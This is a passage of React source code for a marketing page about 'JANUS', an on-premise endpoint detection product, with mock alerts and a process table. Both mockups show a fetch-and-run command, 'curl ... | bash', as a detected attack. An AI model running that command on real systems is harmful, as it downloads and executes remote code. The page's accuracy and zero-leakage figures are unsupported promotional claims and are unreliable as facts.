"use client";

import { useState } from "react";
import Link from "next/link";
import Navbar from "@/components/Navbar";
import Footer from "@/components/Footer";

interface TabData {
  id: string;
  title: string;
  shortTitle: string;
  description: string;
  bullets: string[];
  metrics: { label: string; value: string; sub: string };
  codeSnippet: string;
}

const ENDPOINT_TABS: TabData[] = [
  {
    id: "visibility",
    title: "Realize continuous endpoint visibility without external cloud pipelines",
    shortTitle: "Continuous Visibility",
    description:
      "JANUS Endpoint Security delivers real-time host monitoring, behavioral tracking, and local attack surface reduction directly from within your private network. Deployed fully on-premise on standard Ubuntu Server, JANUS collects, processes, and stores all endpoint telemetry locally with zero phone-home communication. With flat licensing that eliminates recurring per-sensor tax and cloud telemetry limits, security teams can maintain full-fidelity event collection across servers, workstations, and edge compute nodes.",
    bullets: [
      "100% on-premise telemetry aggregation with zero data egress or phone-home telemetry",
      "Continuous auditing of process execution trees, user command logs, and open network sockets",
      "Flat predictable licensing eliminating recurring per-endpoint sensor taxes and retention quotas",
      "Universal native support across Linux servers, Windows workstations, and isolated edge nodes",
    ],
    metrics: {
      label: "DATA LEAKAGE RISK",
      value: "0.00%",
      sub: "Strict air-gap compliance • Telemetry never leaves operational perimeter",
    },
    codeSnippet: `// JANUS Air-Gapped Host Telemetry Pipeline
[Host: PROD-SRV-DB01.internal | Ubuntu 22.04 LTS]
  ↳ Telemetry Channel: Mutual TLS (Local CA: root.janus.lan)
  ↳ OS Kernel Audit: process_creation, socket_bind, file_write
  ↳ Cloud Phone-Home Checks: BLOCKED [0 bytes egress]
  ↳ Local Ingestion Engine: 4,850 EPS (Buffer: SQLite WAL)
  ✓ Telemetry Custody: 100% On-Premise [Air-Gap Verified]`,
  },
  {
    id: "detection",
    title: "Empower deterministic detection with process and behavioral context",
    shortTitle: "Deterministic Detection",
    description:
      "Unlike traditional antivirus software that depends purely on static signature feeds or opaque cloud queries, JANUS leverages deterministic heuristics and OS-level telemetry auditing. Continuous monitoring of process execution trees, anomalous parent-child spawns, unexpected listening ports, and unauthorized privilege escalation allows JANUS to identify living-off-the-land attacks and credential abuse at runtime.",
    bullets: [
      "Framework-aligned detection mapped directly to MITRE ATT&CK enterprise tactics",
      "Anomalous parent-child process tree inspection (e.g. webserver spawning interactive bash)",
      "Real-time detection of living-off-the-land binaries (LOLBins) and fileless persistence",
      "Zero reliance on external cloud scoring models or unpredictable cloud query queues",
    ],
    metrics: {
      label: "DETECTION ACCURACY",
      value: "99.7%",
      sub: "Deterministic heuristic verification • Zero opaque cloud latency",
    },
    codeSnippet: `// MITRE ATT&CK Behavioral Correlation Alert
[ALERT: CRITICAL] T1059.004 - Suspicious Command Shell Spawn
  ↳ Parent Process: /usr/sbin/nginx [pid: 884, uid: 33 (www-data)]
  ↳ Child Process : /bin/bash -c "curl -sSL http://10.10.4.99/p | bash"
  ↳ Anomalous Context: Unprivileged daemon invoked interactive shell
  ↳ Rule Match    : SEC-R-082 (LOLBin & Fileless Execution Pattern)
  ✓ Evaluation    : Local Deterministic Engine [< 12ms]`,
  },
  {
    id: "convergence",
    title: "Fuel SOC + NOC convergence from process tree to physical switch port",
    shortTitle: "SOC + NOC Convergence",
    description:
      "Unify endpoint security with network infrastructure intelligence in a single pane of glass. Because JANUS links endpoint agents directly with its native IPAM and switch port discovery, an endpoint alert is never an isolated host event—it is tied instantly to the machine's MAC address, IP lease, and physical switch port, giving incident responders end-to-end attribution across host and network fabric.",
    bullets: [
      "Instant binding of flagged process PIDs to MAC address, DHCP lease, and switch interface",
      "Hardware-coordinated containment: freeze malicious process and quarantine physical port",
      "One-click isolation via integrated 802.1X/RADIUS VLAN steering or port shutdown",
      "Elimination of organizational silos between endpoint triage and network operations",
    ],
    metrics: {
      label: "TIME TO ATTRIBUTION",
      value: "< 1.2s",
      sub: "From process anomaly to physical switch port identification",
    },
    codeSnippet: `// Unified NOC + SOC Attribution Trace
[Threat Event: PID 1055 on PROD-SRV-DB01]
  ↳ Host Interface : eth0 (10.10.4.12/24)
  ↳ Physical MAC   : e4:5f:01:aa:34:b2 [Dell Inc.]
  ↳ Switch Binding : CORE-SW-01:Gi1/0/14 [VLAN 10: PROD_TIER]
  ↳ Action Triggered: [CONVERGED CONTAINMENT]
      1. Local Process Freeze (SIGSTOP PID 1055)
      2. Switch Interface Shutdown via SNMP write
  ✓ Network Isolation Verified [< 1.4s total elapsed]`,
  },
];

const DEFENSE_PILLARS = [
  {
    title: "Maintain absolute endpoint telemetry custody — completely air-gapped and on-premise",
    description:
      "Secure host assets across air-gapped enclaves and regulated environments without streaming sensitive process arguments, user command logs, or local configuration files to third-party multi-tenant clouds. JANUS enforces policies, parses host telemetry, and records historical events entirely within your private operational boundary.",
    highlight: "100% Air-Gapped Custody",
  },
  {
    title: "Enforce deterministic, framework-aligned host detection",
    description:
      "Correlate endpoint activities directly with the MITRE ATT&CK framework. Detect unauthorized command-line interpreters (e.g., suspicious PowerShell, Bash, or WMI execution), fileless persistence attempts, interactive remote administrative shells (SSH/RDP), and local privilege escalations without introducing compute-heavy background models.",
    highlight: "MITRE ATT&CK Aligned",
  },
  {
    title: "Track system integrity and unauthorized configuration drift",
    description:
      "Continuously audit critical system binaries, security configurations, and active network-listening sockets. JANUS alerts operators to rogue services, unapproved open ports, unauthorized local account creation, and drift from approved baseline security templates.",
    highlight: "Integrity & Drift Audit",
  },
  {
    title: "Harness unified entity aggregation and complete attack timelines",
    description:
      "Link host-level telemetry seamlessly with perimeter firewall drops, flow records, and syslog feeds. When an endpoint experiences a threat event, JANUS compiles the execution path, corresponding network connections, and data transfer volume into a single, cohesive timeline, eliminating the operational friction of stitching logs across multiple disconnected consoles.",
    highlight: "Unified Attack Timeline",
  },
  {
    title: "Prioritize rapid investigation with local artifact inspection",
    description:
      "Equip triage teams with instant visibility into running processes, active socket listeners, local user sessions, and service states. Analysts can quickly verify whether an alert represents benign administrative activity or an active breach without placing heavy analytical burdens on host endpoints.",
    highlight: "Rapid Artifact Inspection",
  },
  {
    title: "Execute direct, hardware-coordinated containment",
    description:
      "Eliminate response delays through converged containment mechanisms. When an endpoint is compromised, JANUS enables direct host-level containment while coordinating with native network controls to quarantine the host's physical switch port or revoke its network access via integrated NAC and firewall rules.",
    highlight: "Hardware-Coordinated Containment",
  },
];

const COMPARISON_ROWS = [
  {
    criterion: "Telemetry Residency & Sovereign Air-Gap",
    sub: "Data leakage & sovereign operational boundary",
    janusPrimary: "100% On-Premise Local Custody",
    janusSecondary: "Zero phone-home calls. Sensitive process arguments and command logs stay within your private network.",
    legacyPrimary: "Mandatory Multi-Tenant Cloud Egress",
    legacySecondary: "Continuous streaming of host telemetry, command arguments, and files to third-party vendor clouds.",
  },
  {
    criterion: "Detection Architecture & Offline Autonomy",
    sub: "Operational responsiveness during network segmentation",
    janusPrimary: "Deterministic Local Heuristics",
    janusSecondary: "Sub-second OS-level audit rules execute locally. Full protection persists even during air-gap isolation.",
    legacyPrimary: "Cloud-Query Dependency",
    legacySecondary: "Detection relies on cloud API roundtrips; degraded protection and blind spots during WAN link outages.",
  },
  {
    criterion: "NOC + SOC Hardware Attribution",
    sub: "Bridging host events to physical infrastructure",
    janusPrimary: "Instant Switch Port & IPAM Binding",
    janusSecondary: "Correlates malicious PIDs directly to physical MAC address, DHCP lease, and switch port (Gi1/0/14).",
    legacyPrimary: "Disconnected Host Silo",
    legacySecondary: "Zero physical network awareness; requires manual coordination tickets with separate network engineering teams.",
  },
  {
    criterion: "Containment Velocity & Port Control",
    sub: "Lateral movement neutralization at machine speed",
    janusPrimary: "Converged Host + Port Quarantine (< 1.4s)",
    janusSecondary: "Freezes compromised processes while simultaneously shutting switch ports or steering VLANs via RADIUS/SNMP.",
    legacyPrimary: "Software Agent-Only Isolation",
    legacySecondary: "Relies solely on endpoint software driver; completely bypassed if rootkit unhooks or terminates the agent.",
  },
  {
    criterion: "Agent Resource Footprint",
    sub: "Host compute stability on production servers",
    janusPrimary: "Ultralight Audit Framework (< 1.2% CPU)",
    janusSecondary: "Minimal memory footprint (35-45MB). Zero heavy local AI model inference slowing down server workloads.",
    legacyPrimary: "Heavy CPU Spikes & Memory Bloat",
    legacySecondary: "High CPU consumption and recurring background scans causing performance degradation on mission-critical servers.",
  },
  {
    criterion: "Licensing & Economic Scalability",
    sub: "Cost predictability without per-endpoint penalties",
    janusPrimary: "Flat Predictable Licensing",
    janusSecondary: "Zero per-sensor taxes or recurring endpoint penalties. Scale servers, workstations, and IoT freely.",
    legacyPrimary: "Per-Endpoint Subscription Tax",
    legacySecondary: "Steep recurring price tiers per sensor, with penalizing data ingestion caps and extended retention surcharges.",
  },
];

export default function EndpointSecurityPage() {
  const [activeTab, setActiveTab] = useState<string>("visibility");

  const currentTab = ENDPOINT_TABS.find((t) => t.id === activeTab) || ENDPOINT_TABS[0];

  return (
    <div className="relative w-full min-h-screen text-white flex flex-col items-center overflow-x-clip bg-janus-bg">
      {/* Main Sticky Navbar */}
      <Navbar />

      {/* Hero Section */}
      <section
        id="overview"
        className="relative w-full min-h-screen bg-theme-gradient text-white pt-24 sm:pt-28 pb-10 sm:pb-14 px-6 sm:px-12 lg:px-16 overflow-hidden border-b border-white/10 flex flex-col justify-center"
      >
        {/* Ambient Purple Glows */}
        <div className="absolute top-10 left-1/4 w-96 h-96 bg-purple-600/20 rounded-full blur-3xl pointer-events-none" />
        <div className="absolute top-20 right-1/4 w-[36rem] h-[36rem] bg-indigo-600/15 rounded-full blur-3xl pointer-events-none" />
        <div className="absolute top-0 right-0 w-[45rem] h-[35rem] bg-[radial-gradient(ellipse_at_top_right,rgba(168,85,247,0.18),transparent_70%)] pointer-events-none" />

        <div className="max-w-7xl mx-auto w-full grid grid-cols-1 lg:grid-cols-12 gap-10 lg:gap-14 items-center relative z-10 my-auto">
          {/* Left Column: Heading, Subtitle & Action Cards */}
          <div className="lg:col-span-6 flex flex-col items-start text-left">
            {/* Huge Bold Title */}
            <h1 className="text-4xl sm:text-5xl lg:text-6xl font-bold tracking-tight text-white leading-[1.05] mb-5">
              On-Prem{" "}
              <span className="bg-gradient-to-r from-purple-200 via-purple-300 to-indigo-200 bg-clip-text text-transparent">
                Endpoint
              </span>{" "}
              Truth,<br />
              Zero Cloud Tax
            </h1>

            {/* Sub-headline */}
            <p className="text-base sm:text-lg text-white/70 font-light leading-relaxed max-w-xl mb-8">
              Real-time host monitoring, behavioral tracking, and local attack surface reduction with zero phone-home pipelines and zero recurring per-sensor tax.
            </p>

            {/* Two Standardized CTA Action Cards */}
            <div className="flex flex-col sm:flex-row gap-4 w-full max-w-lg">
              {/* Purple Filled Button */}
              <a
                href="#capabilities"
                className="bg-purple-600 hover:bg-purple-500 text-white p-4 sm:p-5 rounded-2xl shadow-[0_0_30px_rgba(168,85,247,0.4)] border border-purple-400/40 transition-all duration-300 hover:scale-[1.02] active:scale-95 text-left flex-1 group cursor-pointer"
              >
                <div className="font-semibold text-base sm:text-lg flex items-center justify-between text-white">
                  <span>Take a guided tour</span>
                  <span className="text-xl leading-none transition-transform duration-200 group-hover:translate-x-1">›</span>
                </div>
                <div className="text-xs sm:text-sm text-purple-100/85 font-light mt-1">
                  Got 5 minutes? See how the UI works.
                </div>
              </a>

              {/* Purple Outlined Glass Button */}
              <a
                href="#poc"
                className="bg-white/5 hover:bg-white/10 text-purple-200 border-2 border-purple-500/50 p-4 sm:p-5 rounded-2xl shadow-[0_0_20px_rgba(168,85,247,0.15)] transition-all duration-300 hover:scale-[1.02] active:scale-95 text-left flex-1 group cursor-pointer"
              >
                <div className="font-semibold text-base sm:text-lg flex items-center justify-between text-purple-200 group-hover:text-white">
                  <span>View product brief</span>
                  <span className="text-xl leading-none transition-transform duration-200 group-hover:translate-x-1">›</span>
                </div>
                <div className="text-xs sm:text-sm text-purple-300/75 font-light mt-1">
                  Discover key features and benefits.
                </div>
              </a>
            </div>
          </div>

          {/* Right Column: 3 Overlapping Software Mockup Windows */}
          <div className="lg:col-span-6 relative w-full h-[440px] sm:h-[480px] flex items-center justify-center">
            {/* 1. Background Window: Host Inventory & Process Execution Table */}
            <div className="absolute right-0 top-4 sm:top-6 w-[88%] sm:w-[85%] h-[370px] sm:h-[400px] bg-[#140b1a]/95 rounded-2xl border border-purple-500/25 shadow-[0_25px_60px_rgba(0,0,0,0.8)] overflow-hidden flex flex-col text-white font-sans text-xs backdrop-blur-md">
              {/* Window Header */}
              <div className="px-4 py-3 bg-[#190e22] border-b border-white/10 flex items-center justify-between">
                <div className="flex items-center gap-3">
                  <span className="w-2.5 h-2.5 rounded-full bg-purple-400" />
                  <span className="font-mono text-[11px] text-white/60">
                    Host: PROD-SRV-DB01 · Kernel 5.15.0 · eBPF/Audit Active
                  </span>
                </div>
                <div className="flex items-center gap-1.5">
                  <span className="w-2 h-2 rounded-full bg-white/30" />
                  <span className="w-2 h-2 rounded-full bg-white/30" />
                </div>
              </div>

              {/* Table & Host Context Drawer */}
              <div className="flex-1 flex overflow-hidden">
                {/* Process Execution List */}
                <div className="flex-1 p-3.5 space-y-2 font-mono text-[10px] text-white/60 overflow-hidden">
                  <div className="grid grid-cols-12 pb-1.5 border-b border-white/10 text-[9px] uppercase tracking-wider text-white/40">
                    <span className="col-span-2">PID</span>
                    <span className="col-span-5">Binary / Command</span>
                    <span className="col-span-3">User / Priv</span>
                    <span className="col-span-2 text-right">Status</span>
                  </div>

                  {[
                    { pid: "1", cmd: "/sbin/init", usr: "root (0)", s: "Normal", sc: "text-white/60" },
                    { pid: "884", cmd: "/usr/sbin/nginx -g daemon", usr: "www-data (33)", s: "Audited", sc: "text-emerald-400" },
                    { pid: "1042", cmd: "/usr/sbin/sshd -D", usr: "root (0)", s: "Audited", sc: "text-blue-400" },
                    { pid: "1055", cmd: "curl -sSL http://10.10.4.99/p | bash", usr: "www-data (33)", s: "CRITICAL", sc: "text-red-400" },
                    { pid: "1280", cmd: "/usr/bin/postgres -D /data", usr: "postgres (108)", s: "Normal", sc: "text-white/60" },
                  ].map((row, i) => (
                    <div key={i} className="grid grid-cols-12 py-1 items-center border-b border-white/5">
                      <span className="col-span-2 text-purple-300 font-semibold">{row.pid}</span>
                      <span className="col-span-5 truncate text-white/80">{row.cmd}</span>
                      <span className="col-span-3 text-white/50">{row.usr}</span>
                      <span className={`col-span-2 text-right font-semibold ${row.sc}`}>{row.s}</span>
                    </div>
                  ))}
                </div>

                {/* Right Host Attribution Drawer */}
                <div className="w-36 bg-[#100715] border-l border-white/10 p-3 flex flex-col justify-between font-mono text-[9px] text-white/60">
                  <div className="space-y-2">
                    <div className="text-purple-400 uppercase font-semibold text-[8px] tracking-wider">Host Attribution</div>
                    <div>IP: <span className="text-white">10.10.4.12</span></div>
                    <div>MAC: <span className="text-purple-300">e4:5f:01:aa</span></div>
                    <div>Port: <span className="text-emerald-400">CORE-SW-01:Gi1/0/14</span></div>
                    <div>VLAN: <span className="text-white">10 (PROD_SRV)</span></div>
                    <div>Cloud Egress: <span className="text-emerald-400 font-bold">0 B/s [Strict]</span></div>
                  </div>
                  <div className="pt-2 border-t border-white/10">
                    <span className="inline-block px-1.5 py-0.5 rounded bg-purple-950/60 border border-purple-500/30 text-purple-300 text-[8px]">
                      Agent CPU: 0.8%
                    </span>
                  </div>
                </div>
              </div>
            </div>

            {/* 2. Top-Left Floating Window: MITRE ATT&CK Behavioral Alert */}
            <div className="absolute left-0 top-0 w-[82%] sm:w-[76%] bg-[#1a0e24]/95 rounded-xl border border-purple-500/40 shadow-[0_20px_50px_rgba(0,0,0,0.8)] p-3.5 z-20 text-white font-sans text-xs backdrop-blur-md">
              <div className="flex items-center justify-between pb-2 border-b border-white/10">
                <div className="flex items-center gap-2">
                  <span className="w-2 h-2 rounded-full bg-red-400 animate-ping" />
                  <span className="font-semibold text-white text-[11px]">
                    MITRE T1059.004: LOLBin Command Shell
                  </span>
                </div>
                <span className="font-mono text-[9px] text-red-400 font-bold bg-red-950/40 px-2 py-0.5 rounded border border-red-500/30">
                  Confidence: 99.4%
                </span>
              </div>

              <div className="py-2 space-y-1 font-mono text-[10px] text-white/70">
                <div className="flex justify-between">
                  <span>Parent: <strong className="text-white">nginx [pid:884]</strong></span>
                  <span>Spawned: <strong className="text-red-300">/bin/bash</strong></span>
                </div>
                <div className="text-[9px] text-purple-300/80 truncate">
                  Target: /tmp/.payload_exec (Living-off-the-land pattern)
                </div>
              </div>

              <div className="flex items-center justify-between pt-2 border-t border-white/10">
                <div className="flex items-center gap-1.5 text-[9px] text-emerald-400 font-mono">
                  <span className="w-1.5 h-1.5 rounded-full bg-emerald-400" />
                  <span>Deterministic Rule Verified</span>
                </div>
                <div className="flex gap-1.5">
                  <button className="px-2 py-1 rounded bg-red-600/80 hover:bg-red-500 text-white font-medium text-[9px] shadow-sm">
                    Freeze PID
                  </button>
                  <button className="px-2 py-1 rounded bg-purple-600 hover:bg-purple-500 text-white font-medium text-[9px] shadow-sm">
                    Quarantine Port
                  </button>
                </div>
              </div>
            </div>

            {/* 3. Bottom-Left Floating Window: Hardware-Coordinated Containment Status */}
            <div className="absolute left-2 sm:left-4 bottom-2 w-[74%] sm:w-[68%] bg-[#110717] rounded-xl border border-purple-500/40 shadow-[0_25px_60px_rgba(0,0,0,0.9)] p-3.5 z-30 text-white font-sans text-xs backdrop-blur-md">
              <div className="flex items-center justify-between mb-2.5">
                <span className="font-semibold text-xs text-white">NOC + SOC Converged Response</span>
                <div className="flex items-center gap-2">
                  <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
                  <span className="font-mono text-[9px] text-white/50">Containment Latency: 1.14s</span>
                </div>
              </div>

              <div className="space-y-1.5 font-mono text-[10px] text-white/70">
                <div className="flex items-center justify-between bg-black/40 p-1.5 rounded border border-white/5">
                  <span className="text-white/60">Host Process Isolation:</span>
                  <span className="text-emerald-400 font-semibold">SIGSTOP Enforced</span>
                </div>
                <div className="flex items-center justify-between bg-black/40 p-1.5 rounded border border-white/5">
                  <span className="text-white/60">Switch Port Quarantine:</span>
                  <span className="text-purple-300 font-semibold">VLAN 999 (SNMP CoA)</span>
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Section 2: Measurable Endpoint Defense Without Cloud Overhead (4 Metric Cards) */}
      <section id="outcomes" className="w-full py-16 px-6 sm:px-12 lg:px-16 border-y border-white/10 bg-[#160b1b]/60">
        <div className="max-w-7xl mx-auto">
          <div className="mb-10 text-center">
            <h2 className="text-2xl sm:text-4xl font-light text-white">
              Measurable Endpoint Defense Without Cloud Overhead
            </h2>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
            <div className="p-8 rounded-2xl bg-gradient-to-b from-white/[0.07] to-white/[0.02] border border-white/10 hover:border-purple-500/40 transition-all duration-300 group hover:-translate-y-1">
              <div className="text-xs font-mono text-purple-300 tracking-wider uppercase mb-3">
                Telemetry Custody
              </div>
              <div className="text-5xl font-light text-white tracking-tight mb-3">
                100%
              </div>
              <div className="text-sm text-white/70 font-light leading-relaxed">
                Air-gapped on-premise event retention with zero phone-home calls or external egress.
              </div>
            </div>

            <div className="p-8 rounded-2xl bg-gradient-to-b from-white/[0.07] to-white/[0.02] border border-white/10 hover:border-purple-500/40 transition-all duration-300 group hover:-translate-y-1">
              <div className="text-xs font-mono text-purple-300 tracking-wider uppercase mb-3">
                Agent CPU Overhead
              </div>
              <div className="text-5xl font-light text-white tracking-tight mb-3">
                &lt; 1.2%
              </div>
              <div className="text-sm text-white/70 font-light leading-relaxed">
                Deterministic OS kernel audit framework without compute-heavy background models.
              </div>
            </div>

            <div className="p-8 rounded-2xl bg-gradient-to-b from-white/[0.07] to-white/[0.02] border border-white/10 hover:border-purple-500/40 transition-all duration-300 group hover:-translate-y-1">
              <div className="text-xs font-mono text-purple-300 tracking-wider uppercase mb-3">
                Hardware Attribution
              </div>
              <div className="text-5xl font-light text-white tracking-tight mb-3">
                &lt; 500ms
              </div>
              <div className="text-sm text-white/70 font-light leading-relaxed">
                Instant correlation from suspicious PID to MAC address and physical switch port.
              </div>
            </div>

            <div className="p-8 rounded-2xl bg-gradient-to-b from-white/[0.07] to-white/[0.02] border border-white/10 hover:border-purple-500/40 transition-all duration-300 group hover:-translate-y-1">
              <div className="text-xs font-mono text-purple-300 tracking-wider uppercase mb-3">
                Predictable Economics
              </div>
              <div className="text-5xl font-light text-white tracking-tight mb-3">
                0 Sensor Tax
              </div>
              <div className="text-sm text-white/70 font-light leading-relaxed">
                Flat enterprise licensing with zero per-endpoint subscription penalties or ingestion caps.
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Section 3: Endpoint Defense at Your Fingertips (Tabbed Capability Showcase) */}
      <section id="capabilities" className="w-full py-24 sm:py-32 px-6 sm:px-12 lg:px-16">
        <div className="max-w-7xl mx-auto">
          {/* Section Header */}
          <div className="max-w-4xl mb-16">
            <h2 className="text-3xl sm:text-5xl lg:text-6xl font-normal tracking-tight text-white leading-[1.15]">
              Endpoint Defense at Your Fingertips:{" "}
              <span className="bg-gradient-to-r from-purple-200 via-purple-300 to-indigo-200 bg-clip-text text-transparent">
                Inspect, Detect, and Neutralize at Machine Speed
              </span>
            </h2>
            <p className="text-lg text-white/70 font-light mt-5 leading-relaxed max-w-3xl">
              Explore how JANUS combines continuous host auditing, deterministic MITRE ATT&CK detection, and physical Layer 2 port correlation into a sovereign defense platform.
            </p>
          </div>

          {/* Interactive 3-Tab Selector */}
          <div className="grid grid-cols-1 md:grid-cols-3 gap-3 sm:gap-4 mb-8 sm:mb-10 w-full">
            {ENDPOINT_TABS.map((tab) => {
              const isActive = activeTab === tab.id;
              return (
                <button
                  key={tab.id}
                  onClick={() => setActiveTab(tab.id)}
                  className={`p-4 sm:p-5 rounded-2xl border text-left transition-all duration-300 cursor-pointer ${
                    isActive
                      ? "bg-purple-900/30 border-purple-400/50 shadow-[0_0_25px_rgba(168,85,247,0.25)] text-white"
                      : "bg-white/[0.03] border-white/10 hover:border-purple-400/20 text-white/70 hover:text-white"
                  }`}
                >
                  <div className="font-semibold text-base sm:text-lg mb-1 flex items-center justify-between">
                    <span>{tab.shortTitle}</span>
                    {isActive && <span className="w-2 h-2 rounded-full bg-purple-400 animate-pulse" />}
                  </div>
                  <div className="text-xs sm:text-sm text-white/50 font-light line-clamp-2">
                    {tab.title}
                  </div>
                </button>
              );
            })}
          </div>

          {/* Tab Content Display */}
          <div className="p-8 sm:p-12 rounded-3xl bg-gradient-to-b from-[#23142e] to-[#170c1e] border border-purple-500/20 shadow-[0_20px_50px_rgba(0,0,0,0.5)]">
            <div className="grid grid-cols-1 lg:grid-cols-12 gap-10 items-center">
              {/* Left Column: Explanatory Content & Bullets */}
              <div className="lg:col-span-7 flex flex-col items-start text-left">
                <h3 className="text-2xl sm:text-3xl font-medium text-white mb-4 leading-snug">
                  {currentTab.title}
                </h3>
                <p className="text-base text-white/70 font-light leading-relaxed mb-6">
                  {currentTab.description}
                </p>

                <div className="space-y-3 mb-8 w-full">
                  {currentTab.bullets.map((bullet, idx) => (
                    <div key={idx} className="flex items-start gap-3">
                      <div className="w-5 h-5 rounded-full bg-purple-500/20 border border-purple-400/30 flex items-center justify-center shrink-0 mt-0.5">
                        <span className="text-purple-300 text-xs">✓</span>
                      </div>
                      <span className="text-sm text-white/80 font-light leading-relaxed">
                        {bullet}
                      </span>
                    </div>
                  ))}
                </div>

                {/* Micro Metric Banner */}
                <div className="p-4 rounded-xl bg-purple-950/40 border border-purple-500/30 flex items-center justify-between w-full">
                  <div>
                    <div className="font-mono text-xs text-purple-300 uppercase tracking-wider">
                      {currentTab.metrics.label}
                    </div>
                    <div className="text-xs text-white/50 font-light mt-0.5">
                      {currentTab.metrics.sub}
                    </div>
                  </div>
                  <div className="text-2xl font-bold text-white tracking-tight">
                    {currentTab.metrics.value}
                  </div>
                </div>
              </div>

              {/* Right Column: Code / Terminal Inspection Window */}
              <div className="lg:col-span-5 w-full">
                <div className="rounded-2xl bg-[#110717] border border-purple-500/30 shadow-2xl overflow-hidden text-left font-mono">
                  {/* Window Bar */}
                  <div className="px-4 py-3 bg-[#180a22] border-b border-white/10 flex items-center justify-between">
                    <div className="flex items-center gap-2">
                      <span className="w-2.5 h-2.5 rounded-full bg-purple-400" />
                      <span className="text-xs text-white/60">janus-host-auditor.sh</span>
                    </div>
                    <span className="text-[10px] text-purple-300 uppercase tracking-wider bg-purple-900/30 px-2 py-0.5 rounded border border-purple-500/20">
                      Telemetry Stream
                    </span>
                  </div>
                  {/* Code Body */}
                  <pre className="p-5 text-xs text-purple-200/90 leading-relaxed overflow-x-auto whitespace-pre font-mono">
                    <code>{currentTab.codeSnippet}</code>
                  </pre>
                  {/* Status Footer */}
                  <div className="px-4 py-2 bg-black/40 border-t border-white/5 flex items-center justify-between text-[10px] text-white/40">
                    <span>Audit Pipeline: Active</span>
                    <span className="text-emerald-400 flex items-center gap-1.5">
                      <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" />
                      Live Host Protection
                    </span>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Section 4: Deterministic Host Defense Pillars Grid (6 Pillars) */}
      <section id="architecture" className="w-full py-24 sm:py-32 px-6 sm:px-12 lg:px-16 border-t border-white/10 bg-[#14081c]/50">
        <div className="max-w-7xl mx-auto">
          {/* Section Header */}
          <div className="max-w-3xl mb-16">
            <h2 className="text-3xl sm:text-5xl font-normal tracking-tight text-white leading-tight">
              Deterministic Host Defense Pillars
            </h2>
            <p className="text-base sm:text-lg text-white/60 font-light mt-4 leading-relaxed">
              Six core operational capabilities engineered for absolute telemetry custody, sub-second threat attribution, and hardware-coordinated response.
            </p>
          </div>

          {/* 6-Card Grid */}
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 sm:gap-8">
            {DEFENSE_PILLARS.map((item, idx) => (
              <div
                key={idx}
                className="p-8 rounded-3xl bg-gradient-to-b from-white/[0.06] to-white/[0.01] border border-white/10 hover:border-purple-500/40 transition-all duration-300 group flex flex-col"
              >
                <div className="flex items-center justify-end mb-4">
                  <span className="font-mono text-xs text-white/30">
                    0{idx + 1}
                  </span>
                </div>
                <h3 className="text-xl font-medium text-white mb-3 group-hover:text-purple-200 transition-colors leading-snug">
                  {item.title}
                </h3>
                <p className="text-sm text-white/70 font-light leading-relaxed">
                  {item.description}
                </p>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* Section 5: Why Sovereign Endpoint Security Wins (Comparison Table) (Commented Out) */}
      {/*
      <section id="comparison" className="w-full py-24 sm:py-32 px-6 sm:px-12 lg:px-16 relative overflow-hidden">
        <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[48rem] h-[28rem] bg-purple-600/10 rounded-full blur-[140px] pointer-events-none" />

        <div className="max-w-7xl mx-auto relative z-10">
          <div className="max-w-3xl mb-16 text-center mx-auto">
            <h2 className="text-3xl sm:text-5xl lg:text-6xl font-normal tracking-tight text-white leading-tight">
              Why Sovereign Endpoint Security{" "}
              <span className="bg-gradient-to-r from-purple-200 via-purple-300 to-indigo-200 bg-clip-text text-transparent">
                Wins
              </span>
            </h2>
            <p className="text-base sm:text-lg text-white/60 font-light mt-4 max-w-2xl mx-auto leading-relaxed">
              Compare JANUS with cloud-dependent EDR solutions across telemetry residency, agent footprint, infrastructure correlation, and pricing models.
            </p>
          </div>

          <div className="rounded-3xl bg-[#14081c]/90 border border-white/10 overflow-hidden shadow-[0_25px_70px_rgba(0,0,0,0.7)] backdrop-blur-xl">
            <div className="overflow-x-auto">
              <table className="w-full text-left text-sm font-light border-collapse">
                <thead>
                  <tr className="border-b border-white/10 bg-white/[0.02]">
                    <th className="py-6 px-6 sm:px-8 text-white/50 font-mono text-xs uppercase tracking-wider w-[30%]">
                      Criterion &amp; Architecture
                    </th>
                    <th className="py-6 px-6 sm:px-8 text-white font-semibold text-base sm:text-lg w-[35%] bg-purple-900/20 border-x border-purple-500/20">
                      <div className="flex items-center justify-between">
                        <span>JANUS Sovereign Endpoint</span>
                        <span className="px-3 py-1 rounded-full text-[10px] font-mono tracking-wider uppercase font-semibold bg-purple-500/30 text-purple-200 border border-purple-400/40 shadow-[0_0_12px_rgba(168,85,247,0.35)]">
                          Air-Gapped
                        </span>
                      </div>
                    </th>
                    <th className="py-6 px-6 sm:px-8 text-white/60 font-medium text-base sm:text-lg w-[35%]">
                      Cloud-Brokered EDR (CrowdStrike / Defender)
                    </th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-white/5">
                  {COMPARISON_ROWS.map((row, idx) => (
                    <tr key={idx} className="hover:bg-white/[0.02] transition-colors">
                      <td className="py-6 px-6 sm:px-8 align-top">
                        <div className="text-white font-medium text-base mb-1">
                          {row.criterion}
                        </div>
                        <div className="text-xs text-white/50 font-mono">
                          {row.sub}
                        </div>
                      </td>
                      <td className="py-6 px-6 sm:px-8 align-top bg-purple-900/10 border-x border-purple-500/20">
                        <div className="text-purple-300 font-semibold text-sm mb-1 flex items-center gap-2">
                          <span>✓</span>
                          <span>{row.janusPrimary}</span>
                        </div>
                        <div className="text-xs text-white/80 font-light leading-relaxed">
                          {row.janusSecondary}
                        </div>
                      </td>
                      <td className="py-6 px-6 sm:px-8 align-top text-white/60">
                        <div className="text-white/80 font-medium text-sm mb-1 flex items-center gap-2">
                          <span className="text-red-400/80">✗</span>
                          <span>{row.legacyPrimary}</span>
                        </div>
                        <div className="text-xs text-white/50 font-light leading-relaxed">
                          {row.legacySecondary}
                        </div>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </div>
        </div>
      </section>
      */}

      {/* Section 6: Direct Lab Deployment CTA */}
